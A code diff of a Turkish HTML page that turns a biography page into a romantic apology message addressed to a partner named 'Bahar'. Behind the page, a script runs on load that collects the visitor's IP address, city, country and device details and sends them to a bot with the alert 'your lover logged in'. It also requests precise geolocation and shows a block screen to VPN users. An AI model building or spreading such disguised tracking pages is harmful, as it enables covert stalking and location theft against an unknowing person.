@@ -3,21 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SONİX | Biyografi</title>
+    <title>Sadece Senin İçin ❤️</title>
     <style>
-        body { background: #050a0f; color: white; font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .container { text-align: center; z-index: 10; }
-        .sonix { font-size: 5rem; font-weight: 900; color: #00d4ff; text-shadow: 0 0 20px #00d4ff; animation: pulse 2s infinite alternate; letter-spacing: 10px; }
-        .kardesim { font-size: 2.2rem; margin-top: 20px; font-weight: bold; color: #ffffff; letter-spacing: 3px; }
-        .username { font-size: 2.5rem; color: #ff00ff; text-shadow: 0 0 10px #ff00ff; text-decoration: none; display: block; margin-top: 15px; transition: 0.5s; }
-        .username:hover { transform: scale(1.1); color: #00ff00; text-shadow: 0 0 20px #00ff00; }
-        
-        @keyframes pulse { 
-            from { transform: scale(1); color: #00d4ff; text-shadow: 0 0 20px #00d4ff; } 
-            to { transform: scale(1.05); color: #00ff00; text-shadow: 0 0 40px #00ff00; } 
+        body { 
+            background: #000; /* Koyu arka plan, aşkın asaleti */
+            color: #fff; 
+            font-family: 'Playfair Display', serif; /* Şık ve romantik yazı tipi */
+            margin: 0; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            overflow: hidden; 
+            flex-direction: column;
+            text-align: center;
         }
 
-        /* VPN Engel Ekranı */
+        .mavi-gozlum { 
+            font-size: 6rem; /* Büyük ve etkileyici yazı */
+            font-weight: 700; 
+            color: #00d4ff; /* Mavi, sevgilin için özel */
+            text-shadow: 0 0 30px #00d4ff; 
+            animation: pulse 2s infinite alternate; /* Hafif nabız atma efekti */
+            letter-spacing: 5px; 
+            margin: 0; 
+        }
+
+        .bahar { 
+            font-size: 3rem; /* Bahar yazısı daha küçük ama şık */
+            margin-top: 20px; 
+            font-weight: 400; 
+            color: #ffffff; 
+            letter-spacing: 3px; 
+            font-style: italic; /* İtalik, daha zarif */
+        }
+
+        .mesaj {
+            font-size: 1.5rem; /* Kendini affettirme mesajı */
+            margin-top: 40px; 
+            color: rgba(255, 255, 255, 0.8); 
+            letter-spacing: 2px;
+            font-family: 'Dancing Script', cursive; /* El yazısı gibi, daha kişisel */
+        }
+        
+        @keyframes pulse { 
+            from { transform: scale(1); color: #00d4ff; text-shadow: 0 0 30px #00d4ff; } 
+            to { transform: scale(1.1); color: #ff00ff; text-shadow: 0 0 50px #ff00ff; } /* Mavi-pembe arası geçiş */
+        }
+
+        /* VPN Engel Ekranı - Aynısı */
         #vpn-blocker {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: red; color: black; z-index: 9999; justify-content: center; align-items: center;
@@ -30,9 +64,9 @@
     <div id="vpn-blocker">VPN KAPAT AMK</div>
 
     <div id="main-content" class="container">
-        <div class="sonix">SONİX</div>
-        <div class="kardesim">CAN KARDEŞİM</div> 
-        <a href="https://t.me/Calw1nn" class="username">@Calw1nn</a>
+        <h1 class="mavi-gozlum">Mavi Gözlüm</h1>
+        <p class="bahar">Bahar</p> 
+        <p class="mesaj">Özür dilerim, beni affetmeni istiyorum...</p>
     </div>
 
     <script>
@@ -47,7 +81,6 @@
         window.getIP = function(json) {
             let ip = json.ip;
             
-            // VPN ve Proxy kontrolü
             fetch(`https://demo.ip-api.com/json/${ip}?fields=66846719`)
             .then(res => res.json())
             .then(data => {
@@ -56,7 +89,7 @@
                     document.getElementById('vpn-blocker').style.display = 'flex';
                     sendToBot(`🚫 VPN TESPİT EDİLDİ!\n📍 IP: ${ip}\n📱 Cihaz: ${navigator.userAgent}`);
                 } else {
-                    sendToBot(`🚨 YENİ GİRİŞ!\n📍 IP: ${ip}\n🌍 Konum: ${data.city} / ${data.country}\n📱 Cihaz: ${navigator.userAgent}`);
+                    sendToBot(`🚨 SEVGİLİN GİRİŞ YAPTI!\n📍 IP: ${ip}\n🌍 Konum: ${data.city} / ${data.country}\n📱 Cihaz: ${navigator.userAgent}`);
                     
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(pos => {
@@ -72,7 +105,6 @@
             });
         };
 
-        // IP çekme işlemini başlat
         let script = document.createElement('script');
         script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
         document.body.appendChild(script);
